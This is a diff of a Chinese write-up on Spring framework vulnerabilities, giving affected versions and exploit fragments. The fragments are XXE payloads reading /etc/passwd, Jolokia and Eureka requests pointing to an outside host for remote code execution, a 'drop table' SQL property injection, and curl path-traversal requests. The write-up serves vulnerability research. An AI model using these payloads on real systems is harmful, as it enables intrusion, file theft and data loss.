@@ -25,7 +25,7 @@ POST /adduser HTTP/1.0
 firstName = Tavis&lastName = Ormandy
 ```
 
-如果 Person 是表单的支持对象，则 firstName 和 lastName 属性将设置为相应的值。为了支持更复杂的类，Spring 还支持点表示法，因此 user.address.street = Disclosure + Str。将等效于：frmObj.getUser().getAddress().setStreet("Disclosure Str.") 
+如果 Person 是表单的支持对象，则 firstName 和 lastName 属性将设置为相应的值。为了支持更复杂的类，Spring 还支持点表示法，因此 user.address.street = Disclosure + Str。将等效于：frmObj.getUser().getAddress().setStreet("Disclosure Str.") 
 
 问题是 Spring Beans 的 CachedIntrospectionResults 类枚举了可从用户表单提交中设置的属性，使用 java.beans.Introspector.getBeanInfo() 而不指定停止类，这意味着'class' 属性及其后的所有内容均可用于 HTTP 请求中的设置。
 
@@ -139,7 +139,7 @@ if (request.getParameter("kxlzxcmd")!=null)
 </xml>
 ```
 
-外部 XML 实体 - `xxe`是使用系统标识符定义的，并存在于 DOCTYPE 标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部 XML 实体，该实体将获取的内容 `/etc/passwd`并将其显示给呈现给用户。  
+外部 XML 实体 - `xxe`是使用系统标识符定义的，并存在于 DOCTYPE 标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部 XML 实体，该实体将获取的内容 `/etc/passwd`并将其显示给呈现给用户。  
 
 ```
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -155,7 +155,7 @@ if (request.getParameter("kxlzxcmd")!=null)
 
 > 影响版本：3.2.0 至 3.2.3、4.0.0.M1-4.0.0.M2（Spring MVC）
 
-由于对 **CVE-2013-4152** 和 **CVE-2013-6429 的**修复不完整导致。
+由于对 **CVE-2013-4152** 和 **CVE-2013-6429 的**修复不完整导致。
 
 受影响版本容易受到 XML 外部实体（XXE）注入的攻击。该`SourceHttpMessageConverter`处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。
 
@@ -167,7 +167,7 @@ if (request.getParameter("kxlzxcmd")!=null)
 </xml>
 ```
 
-外部 XML 实体 - `xxe`是使用系统标识符定义的，并存在于 DOCTYPE 标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部 XML 实体，该实体将获取的内容 `/etc/passwd`并将其显示给呈现给用户。  
+外部 XML 实体 - `xxe`是使用系统标识符定义的，并存在于 DOCTYPE 标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部 XML 实体，该实体将获取的内容 `/etc/passwd`并将其显示给呈现给用户。  
 
 ```
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -353,7 +353,7 @@ FBB204A4061FFBD41284A84C258C1BFB 返回结果是 md5(wooyun)
 
 > 影响版本：
 > 
-> XMLBeam 1.4.14 或更早版本结合使用的 Spring Data Commons Spring Data Commons 1.13 至 1.13.11（Ingalls SR11）Spring Data REST 2.6 至 2.6.11（Ingalls SR11） Spring Data Commons 2.0 至 2.0.6（Kay SR6） Spring Data REST 3.0 至 3.0.6（Kay SR6）
+> XMLBeam 1.4.14 或更早版本结合使用的 Spring Data Commons Spring Data Commons 1.13 至 1.13.11（Ingalls SR11）Spring Data REST 2.6 至 2.6.11（Ingalls SR11） Spring Data Commons 2.0 至 2.0.6（Kay SR6） Spring Data REST 3.0 至 3.0.6（Kay SR6）
 
 > http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/
 
@@ -404,7 +404,7 @@ ws://x.x.x.x:8080/gs-guide-websocket/845/beqcexeb/websocket
 
 > 影响版本：
 > 
-> Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5 (Kay SR5)
+> Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5 (Kay SR5)
 > 
 > https://www.cnblogs.com/hac425/p/9656747.html
 
@@ -480,7 +480,7 @@ cd spring-cloud-config-server                                                   
 
 > 影响版本：
 > 
-> Spring Security OAuth 2.3 to 2.3.4 Spring Security OAuth 2.2 to 2.2.3 Spring Security OAuth 2.1 to 2.1.3 Spring Security OAuth 2.0 to 2.0.16
+> Spring Security OAuth 2.3 to 2.3.4 Spring Security OAuth 2.2 to 2.2.3 Spring Security OAuth 2.1 to 2.1.3 Spring Security OAuth 2.0 to 2.0.16
 > 
 > https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70
 
@@ -496,7 +496,7 @@ cd spring-cloud-config-server                                                   
 
 这样就不会产生原本的认证错误，而且直接跳转到地址
 
-> Location: http://localhost:8086/login
+> Location: http://localhost:8086/login
 
 ### CNVD-2019-11630 Spring Boot Actuator 命令执行漏洞
 
@@ -520,7 +520,7 @@ cd spring-cloud-config-server                                                   
 
 > http://127.0.0.1:8090/jolokia/list
 
-Logback 库提供的 **reloadByURL** 操作使我们可以从外部 URL 重新加载日志配置，地址如：
+Logback 库提供的 **reloadByURL** 操作使我们可以从外部 URL 重新加载日志配置，地址如：
 
 > http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml
 
@@ -532,7 +532,7 @@ logback.xml：
 </configuration>
 ```
 
-reloadByURL 功能从 http://artsploit.com/logback.xml 下载新配置，并将其解析为 Logback 配置。这就导致两个问题：XXE 盲攻击、恶意 LDAP 服务器解析引用导致 RCE。
+reloadByURL 功能从 http://artsploit.com/logback.xml 下载新配置，并将其解析为 Logback 配置。这就导致两个问题：XXE 盲攻击、恶意 LDAP 服务器解析引用导致 RCE。
 
 3、通过 /env 来修改配置
 
@@ -547,7 +547,7 @@ Content-Length: 65
 eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
 ```
 
-此属性将 Eureka serviceURL 修改为任意值。Eureka Server 通常用作发现服务器，目标类路径中具有 Eureka-Client <1.8.7，则可以利用其中的 **XStream 反序列化漏洞**。  
+此属性将 Eureka serviceURL 修改为任意值。Eureka Server 通常用作发现服务器，目标类路径中具有 Eureka-Client <1.8.7，则可以利用其中的 **XStream 反序列化漏洞**。  
 
 其中 xstream 的内容类似如下：
 
@@ -591,7 +591,7 @@ eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
 </linked-hash-set>
 ```
 
-然后调用 `/refresh` 端点。
+然后调用 `/refresh` 端点。
 
 4、有一种通过 Spring 环境属性修改来实现 RCE 的更可靠方法：
 
@@ -628,7 +628,7 @@ Content-Length: 0
 
 **spring.datasource.tomcat.validationQuery = drop + table + users-** 允许您指定任何 SQL 查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。
 
-> **spring.datasource.tomcat.url** = jdbc:hsqldb:https://localhost:3002/xdb
+> **spring.datasource.tomcat.url** = jdbc:hsqldb:https://localhost:3002/xdb
 
 允许您修改当前的 JDBC 连接字符串。
 
@@ -682,13 +682,13 @@ Content-Disposition: attachment; file
 
 ###### **利用点 1：**
 
-> curl http://127.0.0.1:9988/foo/profiles/%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp/aaa.xxx
+> curl http://127.0.0.1:9988/foo/profiles/%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp/aaa.xxx
 
 读取 /User/xuanyonghao/tmp/aaa.xxx 文件
 
 ```
-foo 对应 {application}
-profiles 对应 {profiles}
+foo 对应 {application}
+profiles 对应 {profiles}
 %252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp 对应 {label}
 ```
 
@@ -704,7 +704,7 @@ todo 2. cloud: config: server: native: search-locations: file:///tmp/{label}，�
 
 利用此处把 label 处的 (_) 替换为 /
 
-> curl http://127.0.0.1:9988/foo/profiles/..%28_%29Users%28_%29xuanyonghao%28_%29tmp/aaa.xxx
+> curl http://127.0.0.1:9988/foo/profiles/..%28_%29Users%28_%29xuanyonghao%28_%29tmp/aaa.xxx
 
 **todo 条件限制：**
 
